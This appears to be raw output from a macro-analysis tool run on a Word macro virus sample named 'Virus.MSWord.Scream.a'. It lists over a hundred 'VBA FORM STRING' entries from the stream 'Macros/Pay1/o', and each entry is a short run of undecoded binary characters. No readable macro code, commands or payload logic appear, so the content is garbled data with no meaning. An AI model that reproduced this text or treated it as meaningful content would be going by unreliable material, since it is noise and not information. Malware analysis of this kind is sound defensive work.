-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ŏ�jO��ܩ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z�yMΓoz
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C�ޤi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ޤi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����.kk��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����ZY�N�����I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�iZ��Bֻ|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c�*��k�R��y]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~�:f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qdtq�g��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Q�� �X�u,3�.�^�c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Oo#�]Z�H���r�KM%;*!i.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�� ��dOeV�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�������e���8�RK`������-1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~>l+Fj
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G��p�+����'|������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Æ�!.c]�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1殽�iJ;���[3w�x.�1����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9T��F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V��U*S]��7��\�j�vխ��ѲZJ*zP�o6&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���d�]���m��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.lD;��5L�5{fz�0�"g������T��V\��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��q�3�ڤ�7;4碒�I�����mc�e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D�\�>2�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g֝-���k?d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�De5<�6Q�*Y�ZW�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�����ZI=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^G�0H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���-�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ё�s�~���CM���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�UF�	��d�J�퐑�I�"eg��V�!ߥ�ZZ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n6�)oP�AG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8c�;y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�en����s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Aq����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{��lT���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��(��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]P����έa'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R��Q��Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̑�� ����4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��_,#��.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ĤZ#LW�\����!���*#v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%Xӂ�ؕ����F,����KG_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ii����F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���(i�]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Aa�� �H6�P��&Q�x#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{Z�����0��s�o�B9����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s5?���s@�7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|��K�ة
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O>.��Au��j�&�{ED_�#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��h���cY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O����>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%vJ�Rvg�K��VPR����U�m���MMk��GJ��0�H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y("x�WGQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s_�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��֧�K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
XM�0��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$��N���e�Er�Fj��n�i��֏
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8�G�ט�4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O�PZ5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!L0�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��.�-hx�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
髐�V[��lZ~ۻ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r2���V�=�p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
᎚��o�}���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��/i<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�֚%U=a���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t=�?����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g�>=�y��z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ҬTV;�T�r�4n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Kj�ٝeT��7�C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+�iw
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>ң�g�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u{Z0�@f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;ZKn[%�>S�.�^1˒嬝6���<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E�RS�E=9��X9�gi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���J/�KTWM[KA0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*�ڍ�P9��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���2&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|y���-X�kSgR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"u�KU#�4�Z]��(�	�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)}���S0������Ø�<~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{Yvk�F�.9=���Y!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5пx
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H�?ZZ
nWex�҅+Dx�%��,�\m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
oJ�l�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ߨ#|�G<fV�rF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ǚ}״�,�6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+��H�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1��~�ɳI�:��7���#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��5yN�dx
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S�a�{�{��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a���MM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Fֆ�1�y}|;�6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d��/��s\אA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 �k�k�M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}U$�9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ݺٮ-�ޡk!�F3<?�'�1�)�V5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����ޢЦ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��F\ƹ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s�:;|TV�iQR����#�1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�܏%�M�桹�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-�rH �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������3�7K�{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-��s���=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\L+���U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�C�^���[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,u[R|�~�H�s�ׯ�?���_F=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R$}���1�_��q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�z��> }�j�V��z��> }�j�D4ߐ�����m�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%k�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��/�E!w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����K!���\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�5E���e���~������c������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J��0�^9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�K)��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���bxmE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��^ּ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��!�mޒ�USSQ$�tf
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3$d��c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F�k�[SE$N�n��p����&��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�vI�Q����AS�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�F�k�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#�x�9wf��Y!����״�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����ب��*�_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<;UaY�'��_�r��e#�ۥki
